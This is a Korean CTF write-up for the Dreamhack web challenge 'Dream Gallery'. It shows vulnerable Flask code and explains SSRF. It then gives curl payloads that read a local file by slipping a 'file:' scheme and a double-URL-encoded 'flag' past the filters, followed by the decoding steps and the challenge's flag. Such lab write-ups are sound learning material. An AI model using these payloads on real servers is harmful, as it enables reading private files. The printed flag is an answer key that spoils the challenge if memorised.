---
title: "[Dreamhack] Dream Gallery 해설"
author: jyp
date: 2026-06-09 12:00:08 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

# 문제 특징

> 악성 파일을 업로드하는 해킹 기법

## **난이도**: Lv.2
## **카테고리**: 웹해킹

---

# 문제 구조

## 문제파일구성

```
/
├── app.py
└── Dockerfile
```

## 주요 코드 

```python

#app.py

mini_database = []

@app.route('/')
def index():
    return redirect(url_for('view'))


@app.route('/request')
def url_request():
    url = request.args.get('url', '').lower()
    title = request.args.get('title', '')
    if url == '' or url.startswith("file://") or "flag" in url or title == '':
        return render_template('request.html')

    try:
        data = urlopen(url).read()
        mini_database.append({title: base64.b64encode(data).decode('utf-8')})
        return redirect(url_for('view'))
    except:
        return render_template("request.html")


```

이 문제는 서버측에 파일 업로드를 요청해주면 업로드를 해주는 구조다.


# 풀이

## SSRF란?

**SSRF (Server-Side Request Forgery, 서버 사이드 요청 위조) 는 서버가 공격자 대신 요청을 보내게 만드는 취약점입니다.**

## 데이터 불러오기

이 웹 서버는 사용자가 입력한 URL을 받아 서버가 직접 그 주소로 요청을 보내 데이터를 가져오는 기능이 있다.

file:이라는 스키마를 사용하면 서버의 파일을 불러올 수 있다. 하지만 이 문제에는 여러가지 필터가 있으므로, 이를 우회해야 한다.


## 페이로드

1. flag 파일 읽어서 갤러리에 저장
curl "http://타겟주소/request?url=file:/fl%2561g.txt&title=pwn"

2. 저장된 base64 값 확인 (읽은 데이터는 base64로 인코딩되어 /view에 저장됨)
curl "http://타겟주소/view"

3. base64 디코딩
echo "찾은base64값" | base64 -d


# 정답

DH{b2037a026b40cc98804e91b5a2a07f54}